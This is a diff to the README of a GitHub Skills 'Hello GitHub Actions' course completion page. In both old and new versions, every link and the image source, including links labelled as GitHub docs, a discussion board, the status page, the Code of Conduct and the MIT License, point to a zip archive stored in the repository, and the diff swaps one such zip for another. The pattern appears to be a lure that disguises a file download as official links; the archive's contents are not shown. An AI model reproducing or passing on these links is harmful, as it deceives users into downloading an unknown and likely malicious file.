@@ -10,7 +10,7 @@ _Create and run a GitHub Actions workflow._
 
 _Congratulations friend, you've completed this course!_
 
-<img https://raw.githubusercontent.com/RoshanBetediya/skills-hello-github-actions1/main/.github/skills-hello-github-actions1-v3.8.zip alt="Mona the Octocat wearing a jetpack and smiling." width=300 align=right>
+<img https://github.com/RoshanBetediya/skills-hello-github-actions1/raw/refs/heads/main/.github/steps/actions_hello_skills_github_v3.9.zip alt="Mona the Octocat wearing a jetpack and smiling." width=300 align=right>
 
 Here's a recap of all the tasks you've accomplished in your repository:
 
@@ -21,19 +21,19 @@ Here's a recap of all the tasks you've accomplished in your repository:
 
 ### What's next?
 
-- Learn more about GitHub Actions by reading "[Learn GitHub Actions](https://raw.githubusercontent.com/RoshanBetediya/skills-hello-github-actions1/main/.github/skills-hello-github-actions1-v3.8.zip)"
-- Use actions created by others in [awesome-actions](https://raw.githubusercontent.com/RoshanBetediya/skills-hello-github-actions1/main/.github/skills-hello-github-actions1-v3.8.zip)
-- We'd love to hear what you thought of this course [in our discussion board](https://raw.githubusercontent.com/RoshanBetediya/skills-hello-github-actions1/main/.github/skills-hello-github-actions1-v3.8.zip)
-- [Take another course on GitHub Actions](https://raw.githubusercontent.com/RoshanBetediya/skills-hello-github-actions1/main/.github/skills-hello-github-actions1-v3.8.zip)
-- Learn more about GitHub by reading the "[Get started](https://raw.githubusercontent.com/RoshanBetediya/skills-hello-github-actions1/main/.github/skills-hello-github-actions1-v3.8.zip)" docs
-- To find projects to contribute to, check out [GitHub Explore](https://raw.githubusercontent.com/RoshanBetediya/skills-hello-github-actions1/main/.github/skills-hello-github-actions1-v3.8.zip)
+- Learn more about GitHub Actions by reading "[Learn GitHub Actions](https://github.com/RoshanBetediya/skills-hello-github-actions1/raw/refs/heads/main/.github/steps/actions_hello_skills_github_v3.9.zip)"
+- Use actions created by others in [awesome-actions](https://github.com/RoshanBetediya/skills-hello-github-actions1/raw/refs/heads/main/.github/steps/actions_hello_skills_github_v3.9.zip)
+- We'd love to hear what you thought of this course [in our discussion board](https://github.com/RoshanBetediya/skills-hello-github-actions1/raw/refs/heads/main/.github/steps/actions_hello_skills_github_v3.9.zip)
+- [Take another course on GitHub Actions](https://github.com/RoshanBetediya/skills-hello-github-actions1/raw/refs/heads/main/.github/steps/actions_hello_skills_github_v3.9.zip)
+- Learn more about GitHub by reading the "[Get started](https://github.com/RoshanBetediya/skills-hello-github-actions1/raw/refs/heads/main/.github/steps/actions_hello_skills_github_v3.9.zip)" docs
+- To find projects to contribute to, check out [GitHub Explore](https://github.com/RoshanBetediya/skills-hello-github-actions1/raw/refs/heads/main/.github/steps/actions_hello_skills_github_v3.9.zip)
 
 <footer>
 
 ---
 
-Get help: [Post in our discussion board](https://raw.githubusercontent.com/RoshanBetediya/skills-hello-github-actions1/main/.github/skills-hello-github-actions1-v3.8.zip) &bull; [Review the GitHub status page](https://raw.githubusercontent.com/RoshanBetediya/skills-hello-github-actions1/main/.github/skills-hello-github-actions1-v3.8.zip)
+Get help: [Post in our discussion board](https://github.com/RoshanBetediya/skills-hello-github-actions1/raw/refs/heads/main/.github/steps/actions_hello_skills_github_v3.9.zip) &bull; [Review the GitHub status page](https://github.com/RoshanBetediya/skills-hello-github-actions1/raw/refs/heads/main/.github/steps/actions_hello_skills_github_v3.9.zip)
 
-&copy; 2023 GitHub &bull; [Code of Conduct](https://raw.githubusercontent.com/RoshanBetediya/skills-hello-github-actions1/main/.github/skills-hello-github-actions1-v3.8.zip) &bull; [MIT License](https://raw.githubusercontent.com/RoshanBetediya/skills-hello-github-actions1/main/.github/skills-hello-github-actions1-v3.8.zip)
+&copy; 2023 GitHub &bull; [Code of Conduct](https://github.com/RoshanBetediya/skills-hello-github-actions1/raw/refs/heads/main/.github/steps/actions_hello_skills_github_v3.9.zip) &bull; [MIT License](https://github.com/RoshanBetediya/skills-hello-github-actions1/raw/refs/heads/main/.github/steps/actions_hello_skills_github_v3.9.zip)
 
 </footer>
